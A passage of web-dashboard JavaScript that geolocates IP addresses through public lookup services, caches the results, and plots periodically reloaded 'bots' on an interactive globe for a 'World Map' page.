      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(batch),
    });
    
    if (res.ok) {
      var data = await res.json();
      for (var i = 0; i < data.length; i++) {
        var item = data[i];
        if (item.status === 'success' && item.query && item.countryCode) {
          ipInfoCache[item.query] = {
            countryCode: item.countryCode,
            lat: item.lat,
            lon: item.lon,
            city: item.city || null,
            region: item.regionName || null,
            precise: true,
          };
        }
      }
    }
  } catch (e) {
    for (var j = 0; j < batch.length; j++) {
      try {
        var r = await fetch('https://ipapi.co/' + batch[j] + '/json/', { signal: AbortSignal.timeout(2500) });
        if (r.ok) {
          var d = await r.json();
          if (d.country_code && d.latitude) {
            ipInfoCache[batch[j]] = {
              countryCode: d.country_code,
              lat: d.latitude,
              lon: d.longitude,
              city: d.city || null,
              region: d.region || null,
              precise: true,
            };
          }
        }
      } catch (err) {}
      await new Promise(function(r) { setTimeout(r, 150); });
    }
  }
}

window.addEventListener('load', function() {
  setTimeout(function() {
    initGlobe();
    setTimeout(function() {
      if (globe) {
        var w = document.getElementById('globeViz').clientWidth;
        var h = document.getElementById('globeViz').clientHeight;
        globe.width(w);
        globe.height(h);
        globe.pointOfView({ lat: 28, lng: 10, altitude: 2.5 }, 0);
      }
    }, 500);
    loadBots();
    setInterval(loadBots, 5000);
  }, 300);
});

window.addEventListener('resize', function() {
  if (globe) {
    var w = document.getElementById('globeViz').clientWidth;
    var h = document.getElementById('globeViz').clientHeight;
    globe.width(w);
    globe.height(h);
  }
});
</script>
`;

  return getLayout("World Map", content, "world");
}
